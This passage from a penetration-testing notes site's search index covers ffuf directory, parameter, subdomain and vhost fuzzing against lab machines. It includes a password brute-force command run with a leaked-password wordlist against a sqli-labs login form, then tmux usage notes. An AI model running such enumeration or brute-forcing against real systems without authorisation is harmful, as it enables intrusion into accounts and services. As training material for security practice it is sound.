                                                                                                                                                                                                                                                                     \n| URL | http://188.166.173.208:30769/forum\n| --&gt; | http://188.166.173.208:30769/forum/\n    * FUZZ: forum\n\n[INFO] Adding a new job to the queue: http://188.166.173.208:30769/forum/FUZZ\n\n[Status: 301, Size: 326, Words: 20, Lines: 10]                                                                                                                                                                                                                                                                               \n| URL | http://188.166.173.208:30769/blog\n| --&gt; | http://188.166.173.208:30769/blog/\n    * FUZZ: blog\n\n[INFO] Adding a new job to the queue: http://188.166.173.208:30769/blog/FUZZ\n\n[Status: 200, Size: 986, Words: 423, Lines: 56]                                                                                                                                                                                                                                                                              \n| URL | http://188.166.173.208:30769/index.php\n    * FUZZ: index.php\n\n[Status: 200, Size: 986, Words: 423, Lines: 56]                                                                                                                                                                                                                                                                              \n| URL | http://188.166.173.208:30769/\n    * FUZZ: \n\n[INFO] Starting queued job on target: http://188.166.173.208:30769/forum/FUZZ\n\n[Status: 200, Size: 0, Words: 1, Lines: 1]                                                                                                                                                                                                                                                                                   \n| URL | http://188.166.173.208:30769/forum/index.php\n    * FUZZ: index.php\n\n[Status: 200, Size: 21, Words: 1, Lines: 1]                                                                                                                                                                                                                                                                                  \n| URL | http://188.166.173.208:30769/forum/flag.php\n    * FUZZ: flag.php\n\n[Status: 200, Size: 0, Words: 1, Lines: 1]                                                                                                                                                                                                                                                                                   \n| URL | http://188.166.173.208:30769/forum/\n    * FUZZ: \n\n[INFO] Starting queued job on target: http://188.166.173.208:30769/blog/FUZZ\n\n[Status: 200, Size: 1046, Words: 438, Lines: 58]                                                                                                                                                                                                                                                                             \n| URL | http://188.166.173.208:30769/blog/home.php\n    * FUZZ: home.php\n...\n</code></pre>"},{"location":"tools/ffuf/#filters","title":"Filters","text":"<p>You can filter with <code>matches</code> and <code>filters</code>. <code>matches</code> are inclusive. That means they display only values you define. On the other hand <code>filters</code> are exclusive. That means everything except the values you add are displayed. </p> <pre><code># Everything but the status code 403 responses are displayed\nffuf -u http://10.10.105.129/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt -fc 403\n</code></pre> <pre><code># Only status code 200 responses are displayed\nffuf -u http://10.10.105.129/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt -mc 200\n</code></pre> <p>You can add more values to the filter and matches, for example <code>-mc 200,301,302</code> displays only  responses with 200, 301 or 302 HTTP status codes.</p> <p>Sometimes we get a lot of 403 responses for files that don't exist, especially for files with a <code>.</code> in front of them like <code>.htdocs, .php</code>. Instead of excluding 403 codes entirely, and probably miss some important files, we can filter those files with the regex-filter. </p> <pre><code>ffuf -u http://10.10.105.129/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt -fr '/\\..*'\n</code></pre>"},{"location":"tools/ffuf/#filter-and-matcher-options","title":"Filter and matcher options","text":"<pre><code>MATCHER OPTIONS:\n  -mc                 Match HTTP status codes, or \"all\" for everything. (default: 200,204,301,302,307,401,403,405)\n  -ml                 Match amount of lines in response\n  -mr                 Match regexp\n  -ms                 Match HTTP response size\n  -mw                 Match amount of words in response\n\nFILTER OPTIONS:\n  -fc                 Filter HTTP status codes from response. Comma separated list of codes and ranges\n  -fl                 Filter by amount of lines in response. Comma separated list of line counts and ranges\n  -fr                 Filter regexp\n  -fs                 Filter HTTP response size. Comma separated list of sizes and ranges\n  -fw                 Filter by amount of words in response. Comma separated list of word counts and ranges\n</code></pre>"},{"location":"tools/ffuf/#parameter-fuzzing","title":"Parameter fuzzing","text":"<p>Sometimes we don't know what parameters are accepted at an API endpoint or URL. We can <code>fuzz</code> for them.</p> <pre><code>\u2514\u2500# ffuf -u 'http://10.10.18.208/sqli-labs/Less-1/?FUZZ=1' -c -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt       \n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v1.3.1 Kali Exclusive &lt;3\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://10.10.18.208/sqli-labs/Less-1/?FUZZ=1\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200,204,301,302,307,401,403,405\n________________________________________________\n\ntitle                   [Status: 200, Size: 691, Words: 39, Lines: 29]\nfile                    [Status: 200, Size: 691, Words: 39, Lines: 29]\ntype                    [Status: 200, Size: 691, Words: 39, Lines: 29]\npassword                [Status: 200, Size: 691, Words: 39, Lines: 29]\ncontent                 [Status: 200, Size: 691, Words: 39, Lines: 29]\naction                  [Status: 200, Size: 691, Words: 39, Lines: 29]\nc                       [Status: 200, Size: 691, Words: 39, Lines: 29]\n</code></pre> <p>We can see that every response is <code>200</code>. It's not possible every single parameter from the wordlist is a valid parameter. A valid parameter has to have more or less than 39 words or a different size than 691. So we use the filter <code>-fw 39</code> to filter out responses what are 39 words long.</p> <pre><code>\u2514\u2500# ffuf -u 'http://10.10.18.208/sqli-labs/Less-1/?FUZZ=1' -c -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fw 39\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v1.3.1 Kali Exclusive &lt;3\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://10.10.18.208/sqli-labs/Less-1/?FUZZ=1\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200,204,301,302,307,401,403,405\n :: Filter           : Response words: 39\n________________________________________________\n\nid                      [Status: 200, Size: 721, Words: 37, Lines: 29]\n:: Progress: [2588/2588] :: Job [1/1] :: 688 req/sec :: Duration: [0:00:06] :: Errors: 0 ::\n</code></pre> <p>Filtering out responses with 39 words we get the correct parameter <code>id</code></p> <p>We can use seclists word-wordlist if we didn't find anything. It's a bigger list than burp's list (<code>Discovery/Web-Content/raft-medium-words-lowercase.txt</code>).</p>"},{"location":"tools/ffuf/#piping-into-ffuz","title":"Piping into ffuz","text":"<p>After we found the parameter we can <code>fuzz</code> the values. Take a look at the URL and we can see that the ID has to be a integer value. We can use or create a list and save it to a file or, since the values are simple integers, we can create a list in the console and pipe it to ffuf with the paramater <code>-w -</code>.</p> <p>Below are 5 different examples how to create a list <code>[0-255]</code> and pipe it to ffuf.</p> <pre><code>$ ruby -e '(0..255).each{|i| puts i}' | ffuf -u 'http://MACHINE_IP/sqli-labs/Less-1/?id=FUZZ' -c -w - -fw 33\n$ ruby -e 'puts (0..255).to_a' | ffuf -u 'http://MACHINE_IP/sqli-labs/Less-1/?id=FUZZ' -c -w - -fw 33\n$ for i in {0..255}; do echo $i; done | ffuf -u 'http://MACHINE_IP/sqli-labs/Less-1/?id=FUZZ' -c -w - -fw 33\n$ seq 0 255 | ffuf -u 'http://MACHINE_IP/sqli-labs/Less-1/?id=FUZZ' -c -w - -fw 33\n$ cook '[0-255]' | ffuf -u 'http://MACHINE_IP/sqli-labs/Less-1/?id=FUZZ' -c -w - -fw 33\n</code></pre> <p>Again, we have to look at the response and filter out false positives with <code>-fw</code>.</p>"},{"location":"tools/ffuf/#brute-forcing-passwords","title":"Brute-forcing passwords","text":"<p>We can also brute-force passwords. We can look at burp how the header looks like and use a password list like below. We yest again get a lot of false positives so we filter them out by size <code>-fs</code></p> <pre><code>\u2514\u2500# ffuf -u http://10.10.18.208/sqli-labs/Less-11/ -c -w /usr/share/seclists/Passwords/Leaked-Databases/hak5.txt -X POST -d 'uname=Dummy&amp;passwd=FUZZ&amp;submit=Submit' -fs 1435 -H 'Content-Type: application/x-www-form-urlencoded' \n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v1.3.1 Kali Exclusive &lt;3\n________________________________________________\n\n :: Method           : POST\n :: URL              : http://10.10.18.208/sqli-labs/Less-11/\n :: Wordlist         : FUZZ: /usr/share/seclists/Passwords/Leaked-Databases/hak5.txt\n :: Header           : Content-Type: application/x-www-form-urlencoded\n :: Data             : uname=Dummy&amp;passwd=FUZZ&amp;submit=Submit\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200,204,301,302,307,401,403,405\n :: Filter           : Response size: 1435\n________________________________________________\n\np@ssword                [Status: 200, Size: 1526, Words: 100, Lines: 50]\n:: Progress: [2351/2351] :: Job [1/1] :: 663 req/sec :: Duration: [0:00:06] :: Errors: 0 ::\n</code></pre>"},{"location":"tools/ffuf/#vhosts-and-subdomains","title":"VHOSTS and subdomains","text":"<p>There are better tools to enumerate vhost and subdomains but we can try it with <code>ffuf</code> as well.</p> <pre><code># subdomain fuzzing\nffuf -u http://FUZZ.mydomain.com -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 0\n# vhost fuzzing, FFUZ in the header\nffuf -u http://mydomain.com -c -w  /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H  'Host: FUZZ.mydomain.com' -fs 0\n</code></pre> <p>For subdomains we place the <code>FFUZ</code> keyword in front of the domain. If we look for vhosts, we need to send the keyword as a header.</p>"},{"location":"tools/ffuf/#proxying","title":"Proxying","text":"<p>Whether it' for network pivoting or for using BurpSuite plugins you can send all the ffuf traffic through a web proxy (HTTP or SOCKS5).</p> <pre><code>$ ffuf -u http://10.10.18.208/ -c -w /usr/share/seclists/Discovery/Web-Content/common.txt -x http://127.0.0.1:8080\n</code></pre> <p>It's also possible to send only matches to your proxy for replaying:</p> <pre><code>$ ffuf -u http://10.10.18.208/ -c -w /usr/share/seclists/Discovery/Web-Content/common.txt -replay-proxy http://127.0.0.1:8080\n</code></pre> <p>This may be useful if you don't need all the traffic to traverse an upstream proxy and want to minimize resource usage or to avoid polluting your  proxy history.</p>"},{"location":"tools/ffuf/#resources","title":"Resources","text":"<p>github: https://github.com/ffuf/ffuf</p> <p>HTBA: https://academy.hackthebox.com/module/details/54</p> <p>THM: https://tryhackme.com/room/ffuf</p> <p>YT (hackersploit): https://www.youtube.com/watch?v=9Hik0xy9qd0</p> <p>Articles: https://www.hackingarticles.in/comprehensive-guide-on-ffuf/</p>"},{"location":"tools/tmux/","title":"tmux","text":"<p>tmux is an open-source terminal multiplexer for Unix-like  operating systems. It allows multiple terminal sessions to be accessed  simultaneously in a single window. It is useful for running more than  one command-line program at the same time.</p> <p>All commands in <code>tmux</code> start with the prefix. tmux default prefix id Ctrl+B</p>"},{"location":"tools/tmux/#tmux-sessions","title":"tmux sessions","text":"<p>Starting a new session:</p> <p><code>tmux new -s &lt;name_of_session&gt;</code></p> <ul> <li>-s - name of session </li> </ul> <p>Nested tmux sessions (tmux in tmux) are not allowed by default. A new session can be created with the <code>-d</code> parameter (detach)</p> <p><code>tmux new -s &lt;name_of_session&gt; -d</code></p> <p>By default, tmux assigns each session and number, starting with 0. This can be changed with </p> <p>Renaming session: Ctrl+B $</p> <p>A session can be detached (will not be terminated). With <code>tmux ls</code> the detached sessions can be listed and with <code>tmux attach -t &lt;session_name&gt;</code>  reattached</p> <p>Exiting session without terminating it: Ctrl+B D</p> <p>A session can be terminated/killed with</p> <p><code>tmux kill-session -t &lt;session_name&gt;</code></p> <p>Anything open in the session that will be terminated, will be lost. Handle with care and save the work before killing a session</p> <p>It is possible to change sessions witout detaching an attachin sessions. </p> <p>Ctrl+B S offers to select the session with arrow-keys</p> <p>To close all sessions except the one specified by the <code>-t</code> argument.</p> <p><code>tmux kill-session -a -t &lt;session_name&gt;</code></p> <p>The base directory is the directory where tmux was started. All new windows and panes will have that same base directory. To change the  base directory</p> <p>Ctrl+B : - to get into the command prompt and type</p> <p><code>attach -c /dir/ectory/path</code> or <code>a -c /dir/ectory/path</code> or</p>"},{"location":"tools/tmux/#tmux-windows","title":"tmux windows","text":"<p>Starting a new session, automatically starts a new windows as well. </p> <p>If a new window inside the same session is needed, it can be created with Ctrl+B C</p> <p>Ctrl+B , renames the current window and you switch through windows with</p> <p>Cycling between windows is done with Ctrl+B N or Ctrl+B P. Another way is Ctrl+B W wich will display all windows from wich we can select the window (and pane) we want to activate with the Left Right Up Down</p> <p>To close an unresponsive window (and all panes in it) we can use Ctrl+B &amp;</p>"},{"location":"tools/tmux/#tmux-panes","title":"tmux panes","text":"<p>A window can be split horizontally with Ctrl+B \"  and vertically with</p> <p>Ctrl+B % Using Ctrl+B Left Right Up Down changes the current active pane</p> <p>Ctrl+B Ctrl+Left+Right+Up+Down resize the pane. Typing <code>exit</code> closes the current pane. </p> <p>Ctrl+B 0 - 9 switches to the pane with the associated number. Ctrl+B Space toggles between different pane layout.</p> <p>Ctrl+B O switches the most used panels, if pressed at the same time it switches the panes to the pane whith the current active prompt </p> <p>If a pane is unresponsive it can be killed with Ctrl+B X and confirm with <code>Y</code></p> <p>To move the pan clockwise it Ctrl+B { can be used. For counterclockwise movement use Ctrl+B }</p> <p>Converting a pane to a window is done with Ctrl+B !. Ctrl+B Q shows the panel numbers.</p>"},{"location":"tools/tmux/#tmux-copy-mode","title":"tmux copy mode","text":"<p>Enter with Ctrl+B [. With Ctrl+S the whole text wall can be searched.</p>"}]}